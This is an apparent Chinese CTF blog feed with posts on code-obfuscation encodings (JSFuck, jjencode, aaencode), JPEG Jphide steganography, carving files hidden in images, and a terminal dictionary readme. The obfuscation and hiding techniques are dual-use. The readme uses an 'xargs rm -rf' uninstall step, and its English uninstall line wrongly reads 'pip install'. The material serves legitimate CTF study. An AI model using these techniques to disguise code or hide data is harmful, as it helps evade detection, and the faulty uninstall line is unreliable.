title="1.恩尼格玛密码"></a>1.恩尼格玛密码</h4><p>恩尼格玛密码机（德语：Enigma，又译哑谜机，或“谜”式密码机）是一种用于加密与解密文件的密码机。确切地说，恩尼格玛是对二战时期纳粹德国使用的一系列相似的转子机械加解密机器的统称，它包括了许多不同的型号，为密码学对称加密算法的流加密。详细工作原理参考<a href="https://zh.wikipedia.org/wiki/%E6%81%A9%E5%B0%BC%E6%A0%BC%E7%8E%9B%E5%AF%86%E7%A0%81%E6%9C%BA" target="_blank" rel="external">维基百科</a>。</p><p><img src="http://img0.tuicool.com/aQzqIbN.jpg" alt="恩尼格玛密码.jpg"></p><p>在线模拟<a href="http://enigmaco.de/enigma/enigma.html" target="_blank" rel="external">传送门</a></p><p>感兴趣可以观看<a href="http://list.youku.com/albumlist/show?id=23400097&amp;ascending=1&amp;page=1" target="_blank" rel="external">播单:计算机历史文化课</a></p><hr><h3 id="代码混淆加密"><a href="#代码混淆加密" class="headerlink" title="代码混淆加密"></a>代码混淆加密</h3><p>1.<a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="external">asp混淆加密</a></p><p>2.<a href="http://www.zhaoyuanma.com/phpjmvip.html" target="_blank" rel="external">php混淆加密</a></p><p>3.<a href="http://tool.css-js.com/" target="_blank" rel="external">css/js混淆加密</a></p><p>4.<a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="external">VBScript.Encode混淆加密</a></p><hr><h4 id="5-ppencode"><a href="#5-ppencode" class="headerlink" title="5.ppencode"></a>5.ppencode</h4><p>ppencode-Perl把Perl代码转换成只有英文字母的字符串。</p><p><img src="http://img1.tuicool.com/R3mUFjR.png" alt="ppencode.png"></p><p>ppencode<a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="external">传送门</a></p><hr><h4 id="6-rrencode"><a href="#6-rrencode" class="headerlink" title="6.rrencode"></a>6.rrencode</h4><p>rrencode可以把ruby代码全部转换成符号。</p><p><img src="http://img0.tuicool.com/QzYBzyA.jpg" alt="rrencode.jpg"></p><p>rrencode<a href="http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html" target="_blank" rel="external">传送门</a></p><hr><h4 id="7-jjencode-aaencode"><a href="#7-jjencode-aaencode" class="headerlink" title="7.jjencode/aaencode"></a>7.jjencode/aaencode</h4><p>jjencode将JS代码转换成只有符号的字符串，类似于rrencode，介绍的<a href="http://utf-8.jp/public/20090710/jjencode.pps" target="_blank" rel="external">PPT</a>，aaencode可以将JS代码转换成常用的网络表情，也就是我们说的颜文字js加密。</p><p><img src="http://img1.tuicool.com/Rb6beqy.png" alt="aaencode.png"></p><p>aaencode<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="external">传送门</a></p><p>jjencode/aaencode的解密直接在浏览器的控制台里输入密文即可执行解密，想要详细了解jjencode是如何进行请<a href="http://pferrie2.tripod.com/papers/jjencode.pdf" target="_blank" rel="external">参考</a>，你也可以在github上<a href="https://github.com/jacobsoo/Decoder-JJEncode" target="_blank" rel="external">下载</a>实现jjdecoder的源码进行分析。</p><p><img src="http://img2.tuicool.com/R77bMvj.png" alt="aaencode解密.png"></p><hr><h4 id="8-JSfuck"><a href="#8-JSfuck" class="headerlink" title="8.JSfuck"></a>8.JSfuck</h4><p>JSFuck 可以让你只用 6 个字符<code>[ ]( ) ! +</code>来编写 JavaScript 程序。</p><p><img src="http://img1.tuicool.com/VvayAz.png" alt="JSfuck.png"></p><p>JSfuck<a href="http://www.jsfuck.com/" target="_blank" rel="external">传送门</a></p><hr><h4 id="9-jother"><a href="#9-jother" class="headerlink" title="9.jother"></a>9.jother</h4><p>jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：<code>! + ( ) [ ] { }</code>。只用这些字符就能完成对任意字符串的编码。</p><p><a href="http://drops.wooyun.org/author/do9gy" target="_blank" rel="external">do9gy</a>的<a href="http://drops.wooyun.org/web/4410" target="_blank" rel="external">jother编码之谜</a></p><p><img src="http://img1.tuicool.com/7FbiQf3.png" alt="jother.png"></p><p>jother编码<a href="http://tmxk.org/jother/" target="_blank" rel="external">传送门</a></p><p>jother直接在浏览器(IE可以)的控制台里输入密文即可执行解密：</p><p><img src="http://img1.tuicool.com/ayYBJra.png" alt="jother解密.png"></p><hr><h3 id="10-brainfuck"><a href="#10-brainfuck" class="headerlink" title="10.brainfuck"></a>10.brainfuck</h3><p>Brainfuck是一种极小化的计算机语言，按照”Turing complete（完整图灵机）”思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainF**k 语言只有八种符号，所有的操作都由这八种符号(<code>&gt; &lt; + - . , [ ]</code>)的组合来完成。</p><p>明文：hello!</p><pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ .---. +++++ ++..+ ++.&lt;+ +++++ +++++
[-&gt;++ +++++ ++++&lt; ]&gt;+++ ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;--.&lt; +++++ ++[-&gt;
----- --&lt;]&gt; ----- ----- .&lt;
</code></pre><p>brainfuck<a href="http://www.splitbrain.org/services/ook" target="_blank" rel="external">传送门</a></p><p>其他稀奇古怪的编程语言请<a href="http://news.mydrivers.com/1/190/190926.htm" target="_blank" rel="external">参考</a></p><h3 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h3><hr><p><a href="http://www.wechall.net/applet/JPK_406.jar" target="_blank" rel="external">JPK神器</a></p><p><a href="https://github.com/jameslyons/python_cryptanalysis" target="_blank" rel="external">密码破解脚本</a></p><p><a href="https://dl.packetstormsecurity.net/shellcode/shellcodeencdec.py.txt" target="_blank" rel="external">shellcode转换脚本</a></p><h3 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h3><hr><p><a href="https://en.wikipedia.org/wiki/Classical_cipher" target="_blank" rel="external">Wikipedia Classical Cipher</a></p><p><a href="http://cryptogram.org/cipher_types.html" target="_blank" rel="external">Cryptogram Cipher Types</a></p><p><a href="http://www.practicalcryptography.com/" target="_blank" rel="external">Practical Cryptography</a></p><p><a href="http://rumkin.com/tools/cipher/" target="_blank" rel="external">Rumkin Cipher Tools</a></p><p><a href="https://encode-decode.appspot.com/" target="_blank" rel="external">encode-decode</a></p><p><a href="https://www.hackfun.org/" target="_blank" rel="external">4ido10n Blog</a></p><p><a href="http://wordsmith.org/anagram/" target="_blank" rel="external">Anagram</a></p><p><a href="http://www.thonky.com/kryptos/" target="_blank" rel="external">Thonky</a></p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 换位加密 </tag>
            
            <tag> 古典密码 </tag>
            
            <tag> 代码混淆加密 </tag>
            
            <tag> 常见编码 </tag>
            
            <tag> 替换加密 </tag>
            
            <tag> ctf中那些脑洞大开的编码和加密 </tag>
            
            <tag> 文本加密 </tag>
            
            <tag> 机械密码 </tag>
            
            <tag> 密码解密工具 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入理解JPEG图像格式Jphide隐写]]></title>
      <url>/2017/02/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JPEG%E5%9B%BE%E5%83%8F%E6%A0%BC%E5%BC%8FJphide%E9%9A%90%E5%86%99/</url>
      <content type="html"><![CDATA[<h2 id="0x00-隐写原理"><a href="#0x00-隐写原理" class="headerlink" title="0x00 隐写原理"></a>0x00 隐写原理</h2><p>Jphide是基于最低有效位LSB的<a href="http://www.cnblogs.com/leaven/archive/2010/04/06/1705846.html" target="_blank" rel="external">JPEG格式</a>图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在<a href="https://en.wikipedia.org/wiki/Discrete_cosine_transform" target="_blank" rel="external">DCT变换域</a>上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时<a href="http://baike.baidu.com/link?url=OWM-kQRYlFaJ2Sy7m1E_Z_-fnvknJTRSHwk1f3eoabLsbht1TJa07GmvWRoiOg6U7-0-Ey3vb_UHcDm9Pc7Mgq" target="_blank" rel="external">Blowfish算法</a>有较强的抗统计检测能力。</p><p>由于JPEG图像格式使用<a href="http://baike.baidu.com/view/391624.htm?fr=aladdin&amp;fromtitle=DCT&amp;fromid=4184&amp;type=syn" target="_blank" rel="external">离散余弦变换</a>（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种<a href="http://baike.baidu.com/link?url=7eIl--nFUaz-amKaY9jatpW4J-J2JyZEXy8dYJM4Py1CspzR9mUATKgTyXOCt7M6AjFSv4JmF3YKtXTTAauHm_" target="_blank" rel="external">有损压缩</a>（Loss Compression）技术，但一般不会影响图像的视觉效果。</p><h2 id="0x01-隐写过程"><a href="#0x01-隐写过程" class="headerlink" title="0x01 隐写过程"></a>0x01 隐写过程</h2><p>Jphide隐写过程大致为：先解压压缩JPEG图像，得到DCT系数；然后对隐藏信息用户给定的密码进行Blowfish加密；再利用Blowfish算法生成伪随机序列，并据此找到需要改变的DCT系数，将其末位变为需要隐藏的信息的值。最后把DCT系数重新压回成JPEG图片，下面是个人对隐写过程理解画出的大致流程图。</p><p><img src="http://i.imgur.com/kb6USbH.png" alt=""></p><a id="more"></a><h2 id="0x02-隐写实现"><a href="#0x02-隐写实现" class="headerlink" title="0x02 隐写实现"></a>0x02 隐写实现</h2><p><strong>（1）Stegdetect</strong></p><p>实现JPEG图像Jphide隐写算法工具有多个，比如由Neils Provos开发通过统计分析技术评估JPEG文件的DCT频率系数的隐写工具<a href="https://github.com/abeluck/stegdetect" target="_blank" rel="external">Stegdetect</a>，它可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息，并且还具有基于字典暴力破解密码方法提取通过Jphide、outguess和jsteg-shell方式嵌入的隐藏信息。</p><p><strong>（2）JPHS</strong></p><p>而这里介绍另一款JPEG图像的信息隐藏软件<a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/programs.htm" target="_blank" rel="external">JPHS</a>，它是由Allan Latham开发设计实现在Windows和Linux系统平台针对有损压缩JPEG文件进行信息加密隐藏和探测提取的工具。软件里面主要包含了两个程序JPHIDE和JPSEEK， JPHIDE程序主要是实现将信息文件加密隐藏到JPEG图像功能，而JPSEEK程序主要实现从用JPHIDE程序加密隐藏得到的JPEG图像探测提取信息文件，Windows版本的JPHS里的JPHSWIN程序具有图形化操作界面且具备JPHIDE和JPSEEK的功能。</p><p><img src="http://i.imgur.com/BzbsFlS.png" alt=""></p><p>1.Windows用户请下载<a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/jphs05.zip" target="_blank" rel="external">JPHS-05 for Windows</a>,同时也提供下载<a href="http://linux01.gwdg.de/~alatham/stego.html" target="_blank" rel="external">Linux版本</a>。</p><p>2.分别准备一个JPEG格式的图片（example.jpg）和一个文本文件（flag.txt）。</p><p><img src="http://i.imgur.com/C8DQKFo.png" alt=""></p><p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。</p><p>这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI（Start of Image）和应用程序保留标记APP0（Application 0），JPEG文件交换格式的JPEG图片开始前2个字节是图像开始标记为0xFFD8，之后2个字节接着便是应用程序保留标记为0xFFE0，应用程序保留标记APP0包含9个具体字段，这里介绍前三个字段，第一个字段是数据长度占2个字节，表示包括本字段但不包括标记代码的总长度，这里为10个字节，第二个字段是标识符占5个字节0x4A46494600表示“JFIF0”字符串，第三个字段是版本号占2个字节，这里是0X0101，表示JFIF的版本号为1.1，但也可能为其它数值，从而代表了其它版本号。</p><p><img src="http://i.imgur.com/ciEvX2s.png" alt=""></p><p>3.Windows版本可以使用具有图形化操作界面的Jphswin，选择“Open jpeg”打开示例JPEG格式图片example.jpg</p><p><img src="http://i.imgur.com/kipH6L0.png" alt=""></p><p>如果你选择的不是JPEG格式的图片程序会自动退出，你可以16进制编辑器如Winhex查看图片的图像开始标记SOI和应用程序保留标记APP0，当载入JPEG格式图片会显示一些图片的属性。</p><p><img src="http://i.imgur.com/ImK54U1.png" alt=""></p><p>4.选择“Hide”选项之后在两次文本框输入相同的密码，这里以输入flag作为密码为例，然后输入要包含隐藏信息的文本。</p><p><img src="http://i.imgur.com/QYrSVtE.png" alt=""></p><p>5.选择将要隐藏的信息如flag.txt。</p><p><img src="http://i.imgur.com/XfbEvQS.png" alt=""></p><p>6.选择“Save jpeg as”选项将图片另存为jpeg格式并输入文件的名称为新的图像文件如C4n-u-find-f14g.jpg。</p><p><img src="http://i.imgur.com/sj8X3aP.png" alt=""></p><p>7.之后便可以看到生成结果和相关信息。</p><p><img src="http://i.imgur.com/HPkvnci.png" alt=""></p><p>8.第2步到第7步做的是Jhide方式信息隐藏，接下来我们从C4n-u-find-f14g.jpg图片提取出隐藏信息。</p><p><img src="http://i.imgur.com/H9QJnHU.jpg" alt=""></p><p>9.如果之前你并不知道图片是基于什么方式进行信息隐藏，你可以使用Stegdetect先进行探测。</p><p>Stegdetect的主要选项如下：</p><blockquote><p>-q 仅显示可能包含隐藏内容的图像。</p><p>-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</p><p>-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</p><p>-d 打印带行号的调试信息。</p><p>-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</p><ul><li>j 检测图像中的信息是否是用jsteg嵌入的。</li><li>o 检测图像中的信息是否是用outguess嵌入的。</li><li>p 检测图像中的信息是否是用jphide嵌入的。</li><li>i 检测图像中的信息是否是用invisible secrets嵌入的。</li></ul><p>-V 显示软件版本号。</p><p>如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在检测结果后面使用1～3颗星来标识<br>隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</p></blockquote><p>从下图可以看出很可能是Jphide的信息隐藏方式：</p><p><img src="http://i.imgur.com/i3zeRUx.png" alt=""></p><p>10.在知道隐藏方式之后可以开始进行信息提取，和使用JPHS进行信息隐藏过程类似，打开需要提取隐藏信息的图片C4n-u-find-f14g.jpg，输入对应密码（在不知道密码的情况不可以尝试Stegdetect工具里的Stegbreak程序进行基于字典的暴力攻击）flag，密码验证通过JPHS会自动提取隐藏信息，之后便可以另存提取出的信息。</p><p><img src="http://i.imgur.com/aCnBL4u.png" alt=""></p><p>11.打开提取得到的find.txt便可以得到我们想要的隐藏信息。</p><p><img src="http://i.imgur.com/1whWnla.png" alt=""></p><h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><p><a href="http://mall.cnki.net/magazine/article/JSJC201006056.htm" target="_blank" rel="external">Jphide原理剖析及检测</a></p><p><a href="http://www.cnki.com.cn/Article/CJFDTotal-JSJC200707054.htm" target="_blank" rel="external">基于二次加密的JPhide隐写检测方法</a></p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jphide隐写 </tag>
            
            <tag> 隐写 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pyonlinedict Linux终端在线字典]]></title>
      <url>/2017/01/26/pyonlinedict-Linux%E7%BB%88%E7%AB%AF%E5%9C%A8%E7%BA%BF%E5%AD%97%E5%85%B8/</url>
      <content type="html"><![CDATA[<p><img src="https://www.hackfun.org/usr/uploads/2016/10/597107301.gif" alt="pyonliedict.gif"></p><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>有时候使用linux，在终端经常遇到一些不会的英文单词句子，又嫌难得再去开个浏览器去查，于是便动手写一个在终端就可以查询的脚本，有兴趣将将就用用吧。</p><h1 id="0x01-中文说明"><a href="#0x01-中文说明" class="headerlink" title="0x01 中文说明"></a>0x01 中文说明</h1><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h2><p>pyonlinedict是一个基于python 2.7开发的命令行在线字典，支持27种语言的字词或句子翻译查询，当我们遇到不会字词或句子时，可以通过它轻松查询意思。</p><h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/sunnyelf/pyonlinedict.git</div><div class="line"></div><div class="line">cd pyonlinedict</div><div class="line"></div><div class="line">tar -xzvf pyonlinedict-1.0.6.tar.gz</div><div class="line"></div><div class="line">python setup.py install --record install_path.txt</div></pre></td></tr></table></figure><p>或者直接：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install pyonlinedict</div></pre></td></tr></table></figure><p></p><h2 id="4-用法"><a href="#4-用法" class="headerlink" title="4.用法"></a>4.用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">用法：pyonlinedict [选项]</div><div class="line"></div><div class="line">  选项：</div><div class="line">   -h，--help         显示帮助消息并退出</div><div class="line">   </div><div class="line">   -q，--query        要查询的字或句子（必需的参数）</div><div class="line">   </div><div class="line">   -f，--from         输入语言的类型（默认设置：auto）</div><div class="line">   </div><div class="line">   -t，--to           输出语言的类型（默认设置：zh）</div><div class="line">   </div><div class="line">   -l，--list         列出支持的语言类型</div><div class="line">   </div><div class="line">   -v，-version       显示当前版本号和作者信息</div><div class="line"></div><div class="line">  用例：</div><div class="line">  </div><div class="line">   pyonlinedict -h</div><div class="line">   </div><div class="line">   pyonlinedict -l</div><div class="line">   </div><div class="line">   pyonlinedict -v</div><div class="line">   </div><div class="line">   pyonlinedict -q hello</div><div class="line">   </div><div class="line">   pyonlinedict -q hello -f en -t zh</div><div class="line">   </div><div class="line">   pyonlinedict -q &apos;hello world&apos; -f en -t zh</div></pre></td></tr></table></figure><h2 id="5-卸载"><a href="#5-卸载" class="headerlink" title="5.卸载"></a>5.卸载</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat install_path.txt | xargs rm -rf</div></pre></td></tr></table></figure><p>通过pip方式安装的卸载方法：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip uninstall pyonliedict</div></pre></td></tr></table></figure><p></p><a id="more"></a><h1 id="0x02-英文说明"><a href="#0x02-英文说明" class="headerlink" title="0x02 英文说明"></a>0x02 英文说明</h1><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a>1.Introduction</h2><p>Pyonlinedict is a command-line online dictionary based on Python 2.7 that supports queries in 27 languages or sentences. It is easy to find meaning when we encounter words or sentences that are not words or sentences.</p><h2 id="2-Installation"><a href="#2-Installation" class="headerlink" title="2.Installation"></a>2.Installation</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/suunyelf/pyonlinedict.git</div><div class="line"></div><div class="line">cd pyonlinedict</div><div class="line"></div><div class="line">tar -xzvf pyonlinedict-1.0.6.tar.gz</div><div class="line"></div><div class="line">python setup.py install --record install_path.txt</div><div class="line"></div><div class="line">Or directly:</div><div class="line"></div><div class="line">pip install pyonlinedict</div></pre></td></tr></table></figure><h2 id="3-Usage"><a href="#3-Usage" class="headerlink" title="3.Usage"></a>3.Usage</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">Usage: pyonlinedict [options]</div><div class="line"></div><div class="line"> Options: </div><div class="line"> </div><div class="line">  -h, --help          Show help message and exit</div><div class="line">  </div><div class="line">  -q, --query         The word or sentence to be queried(required parameters)</div><div class="line">  </div><div class="line">  -f, --from          The type of the input language(default setting:auto)</div><div class="line">  </div><div class="line">  -t, --to            The type of the output language(default setting:zh)</div><div class="line">  </div><div class="line">  -l, --list          List the supported language types</div><div class="line">  </div><div class="line">  -v, --version       Displays the current version number and author information</div><div class="line"></div><div class="line"> Usages: </div><div class="line"> </div><div class="line">  pyonlinedict -h</div><div class="line">  </div><div class="line">  pyonlinedict -l</div><div class="line">  </div><div class="line">  pyonlinedict -v</div><div class="line">  </div><div class="line">  pyonlinedict -q hello</div><div class="line">  </div><div class="line">  pyonlinedict -q hello -f en -t zh</div><div class="line">  </div><div class="line">  pyonlinedict -q 'Hello world!' -f en -t zh</div></pre></td></tr></table></figure><h2 id="5-Uninstall"><a href="#5-Uninstall" class="headerlink" title="5.Uninstall"></a>5.Uninstall</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat install_path.txt | xargs rm -rf</div></pre></td></tr></table></figure><p>Unloading method installed by pip:<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install pyonliedict</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python下的命令行在线字典 </tag>
            
            <tag> pyonlinedict </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF中图片隐藏文件分离方法总结]]></title>
      <url>/2017/01/12/CTF%E4%B8%AD%E5%9B%BE%E7%89%87%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%88%86%E7%A6%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在安全的大趋势下，信息安全越来越来受到国家和企业的重视，所以CTF比赛场次越来越多，而且比赛形式也不断的创新，题目也更加新颖有趣，对选手的综合信息安全能力有一个较好的考验，当然更好的是能从比赛有所收获，不断学习和总结提升自己的信息安全能力与技术。转到CTF比赛上，通常在CTF比赛中常有与隐写术(Steganography)相关的题目出现，这里我们讨论总结图片隐藏文件分离的方法，欢迎大家补充和交流:P</p><a id="more"></a><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>这里我们以图片为载体，给了这样的一样图片：</p><p><img src="http://img0.tuicool.com/QVVreiR.jpg" alt="CTF中图片隐藏文件分离方法总结"></p><p>首先我们需要对图片进行分析，这里我们需要用到一个工具<a href="https://github.com/devttys0/binwalk" target="_blank" rel="external">binwalk</a>，想要了解这个工具可以参考这篇<a href="http://www.freebuf.com/sectool/15266.html" target="_blank" rel="external">Binwalk：后门（固件）分析利器</a>文章，以及<a href="http://tools.kali.org/forensics/binwalk" target="_blank" rel="external">kali官方对binwalk的概述和使用介绍</a>。</p><p>这里我们就是最简单的利用，在binwalk后直接提供固件文件路径和文件名即可:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span> binwalk carter.jpg</div></pre></td></tr></table></figure><p>当我们使用这行命令后，binwalk就会自动分析这个jpg文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span> binwalk carter.jpg</div><div class="line"> </div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">382           0x17E           Copyright string: "Copyright (c) 1998 Hewlett-Packard Company"</div><div class="line">3192          0xC78           TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">140147        0x22373         JPEG image data, JFIF standard 1.01</div><div class="line">140177        0x22391         TIFF image data, big-endian, offset of first image directory: 8</div></pre></td></tr></table></figure><p>从上面的内容显然看得出来这个jpg文件还隐藏着另一个jpg文件，从140147块偏移开始就是另一张jpg。</p><h2 id="0x02-分离"><a href="#0x02-分离" class="headerlink" title="0x02 分离"></a>0x02 分离</h2><p>在得到隐藏信息之后我们下一步就是把另一张jpg分离出，以下讨论几种方法：</p><p><strong>（1）使用dd命令分离(linux/unix下)</strong></p><p>我们可以使用dd命令分离出隐藏文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span> dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1</div></pre></td></tr></table></figure><p>可以参考<a href="http://www.cnblogs.com/qq78292959/archive/2012/02/23/2364760.html" target="_blank" rel="external">dd命令详解</a>，这里if是指定输入文件，of是指定输出文件，skip是指定从输入文件开头跳过140147个块后再开始复制，bs设置每次读写块的大小为1字节 。</p><p>最后我们可以得到这样的一张carter-1.jpg图片：</p><p><img src="http://img0.tuicool.com/maqeiyb.jpg" alt="CTF中图片隐藏文件分离方法总结"></p><p><strong>（2）使用foremost工具分离</strong></p><p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载地址，Linux可以<br>通过下面命令安装使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span> apt-get install foremost</div></pre></td></tr></table></figure><p>安装foremost后你可以使用foremost -help查看使用帮助，这里最简单分离文件的命令为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span> foremost carter.jpg</div></pre></td></tr></table></figure><p>当我们使用这行命令后，foremost会自动生成output目录存放分离出文件：</p><p><img src="http://img2.tuicool.com/73Ub2iF.png" alt="CTF中图片隐藏文件分离方法总结"></p><p><strong>（3）hex编辑器分析文件</strong></p><p>至于hex编辑器有很多，win下有用得较多的winhex,UltraEdit等，linux下有hexeditor等，这里我们以winhex为例手动分离，在分离之前我们需要知道一点关于jpg文件格式的知识，jpg格式文件开始的2字节是图像开始SOI(Start of Image,SOI)为FF D8，之后2个字节是JFIF应用数据块APPO(JFIF application segment)为FF E0 ，最后2个字节是图像文件结束标记EOI(end-of-file)为FF D9 ，如果你想详细了解更多关于这方面的知识可以参考<a href="http://blog.csdn.net/liuqz2009/article/details/8270355" target="_blank" rel="external">jpg文件格式分析</a>一文。</p><p>用winhex打开图片，通过Alt+G快捷键输入偏移地址22373跳转到另一张jpg的图像开始块，可以看到FF D8图像开始块。</p><p><img src="http://img2.tuicool.com/QFjmuqr.png" alt="CTF中图片隐藏文件分离方法总结"></p><p>而图像结束块FF D9</p><p><img src="http://img0.tuicool.com/aqmqe2z.png" alt="CTF中图片隐藏文件分离方法总结"></p><p>选取使用Alt+1快捷键选取FF为开始的块，Alt+2选取D9为结束块，然后右键-&gt;Edit-&gt;Copy Block-&gt;Into New File保存相应的文件后缀，例如new.jpg</p><p><img src="http://img1.tuicool.com/IvYJVbB.png" alt="CTF中图片隐藏文件分离方法总结"></p><h2 id="0x03-其他"><a href="#0x03-其他" class="headerlink" title="0x03 其他"></a>0x03 其他</h2><p>还有一种特例，它是事先制作一个hide.zip，里面放入隐藏的文件，再需要一张jpg图片example.jpg，然后再通过命令 copy /b example.jpg+hide.zip output.jpg生成output.jpg的新文件，原理是利用了copy命令，将两个文件以二进制方式连接起来，正常的jpg文件结束标志是FF D9，而图片查看器会忽视jpg结束符之后的内容，所以我们附加的hide.zip就不会影响到图像的正常显示。(参考AppLeU0的<a href="http://drops.wooyun.org/tips/4862" target="_blank" rel="external">隐形术总结</a>)</p><p>针对这种特例我们可以直接将jpg文件改为zip文件后缀(其他文件如rar文件也类似)，就可以看到hide.zip压缩包里隐藏的文件。</p><p>比如当我们得到一张wh3r3_is_f14g.jpg文件：</p><p><img src="http://img2.tuicool.com/byqU7nY.jpg" 